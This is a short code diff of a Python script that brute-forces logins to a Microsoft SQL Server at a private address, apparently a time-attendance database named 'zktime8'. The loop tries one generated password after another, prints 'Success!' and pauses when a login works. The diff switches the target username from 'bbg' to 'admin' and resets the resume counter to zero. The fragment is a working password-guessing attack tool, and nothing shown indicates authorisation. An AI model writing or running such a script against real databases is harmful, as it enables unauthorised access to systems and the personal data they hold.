@@ -82,15 +82,17 @@ def main(n):
     i = 0
     for j in password:
         i += 1
-        if i >= 518128:  # 断点
+        if i >= 0:  # 断点
             try:
-                ms = MsSql(host="192.168.2.228", user="bbg", pwd=''.join(tuple(j)),
+                ms = MsSql(host="192.168.2.228", user="admin", pwd=''.join(tuple(j)),
                            db="zktime8")
                 query = ms.exec_query("SELECT GETDATE() AS CurrentDateTime")
                 print('Success!', j, ';', query)
                 input('Wait........')
             except Exception as e:
                 print('id:', i, '，try:', ''.join(tuple(j)), e)
+            # finally:
+            #     print('id:', i, '，try:', ''.join(tuple(j)), e)
 
 
 if __name__ == '__main__':
